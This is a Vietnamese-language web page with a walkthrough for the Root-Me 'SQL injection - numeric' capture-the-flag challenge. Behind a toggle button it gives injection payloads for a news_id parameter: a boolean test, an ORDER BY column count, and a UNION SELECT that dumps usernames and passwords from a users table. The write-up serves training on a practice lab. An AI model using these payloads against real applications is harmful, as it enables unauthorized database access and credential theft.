<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-sql1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    SQLi Numberic
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a></div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-numeric" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-numeric</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>CMS v 0.0.1</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the administrator password</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Thử cách chức năng xem của website,ta URL có dạng: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1</a></p>
                <h2 id="Test-loi-tim-noi-khai-thac"><a href="#Test-loi-tim-noi-khai-thac" class="headerlink" title="Test lỗi,tìm nơi khai thác"></a>Test lỗi,tìm nơi khai thác</h2>
                <p>Test thử với news_id:</p>
                <blockquote>
                    <p>-1 OR 1=1 -- #</p>
                </blockquote>
                <p>Ta thấy ID sai nhưng kết quả lại có sổ ra cả 3. (Do False OR True = True)</p>
                <h2 id="Tim-so-cot"><a href="#Tim-so-cot" class="headerlink" title="Tìm số cột"></a>Tìm số cột</h2>
                <blockquote>
                    <p>-1 ORDER BY 3 -- #</p>
                </blockquote>
                <p>Đúng,thử với 4 sai, suy ra số cột là 3.</p>
                <h2 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h2>
                <blockquote>
                    <p>-1 UNION SELECT 1,username,password from users -- #</p>
                </blockquote>
                <p>Easy.</p>
                </div></div>

        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>